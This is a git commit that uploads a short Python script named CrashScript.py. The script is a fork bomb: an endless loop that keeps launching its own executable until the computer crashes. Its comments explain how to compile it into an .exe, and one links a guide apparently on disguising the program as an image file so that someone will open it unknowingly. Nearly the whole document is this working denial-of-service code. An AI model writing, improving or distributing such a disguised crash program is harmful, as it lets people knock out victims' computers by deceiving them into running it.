705841da4924935a7347c777a38d4a81d86a802e
Lucas Roder <87400549+LucasRoder@users.noreply.github.com>
2026-02-25 23:37:43 -0800

    Add files via upload

---
+++ ComputerCrash/CrashScript.py
@@ -0,0 +1,12 @@
+
+import os
+import sys
+#pip install auto-py-to-exe
+#auto-py-to-exe
+
+while True:# file will continusly launch itself
+    os.startfile(sys.executable) # sys.executable always points to the actual .exe you clicked
+
+#https://www.youtube.com/watch?v=lyVqm0b2cdk&list=PL8KnQ7ULK8egs86oy1gRRa21CGDrEefPw&index=6
+
+#convert to image #https://www.youtube.com/watch?v=wrD6jFsLPYI
